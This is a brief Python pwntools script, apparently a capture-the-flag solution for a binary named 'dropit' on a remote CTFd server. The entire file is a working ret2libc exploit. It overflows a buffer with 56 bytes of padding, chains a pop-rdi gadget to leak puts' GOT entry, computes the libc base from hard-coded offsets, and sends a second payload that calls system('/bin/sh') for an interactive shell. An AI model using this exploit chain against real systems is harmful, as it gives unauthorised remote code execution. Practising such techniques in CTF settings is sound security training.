#!/bin/python3

from pwn import *

p = process('./dropit')
f = open('./out', 'wb')

poprdi = p64(0x401203)
putsgot = p64(0x403fc8)
putsplt = p64(0x401030)
main_addr = p64(0x401146)

leak_base_payload = b"A"*56 + poprdi + putsgot + putsplt + main_addr

p = remote('challenges.ctfd.io', 30261)
p.recvline()
p.sendline(leak_base_payload)
address = p.recvline().rstrip()
print(address)
f.write(address)

puts_addr = int.from_bytes(address, byteorder='little')
puts_offset = 0x766b0
libc_base = puts_addr - puts_offset

system_offset = 0x48f20
system_addr = libc_base + system_offset
system = p64(system_addr)
binsh_offset = 0x18a156
binsh_addr = libc_base + binsh_offset
binsh = p64(binsh_addr)

shell_payload = b"A"*56 + poprdi + binsh + system

p.sendline(shell_payload)
p.interactive()

f.close()
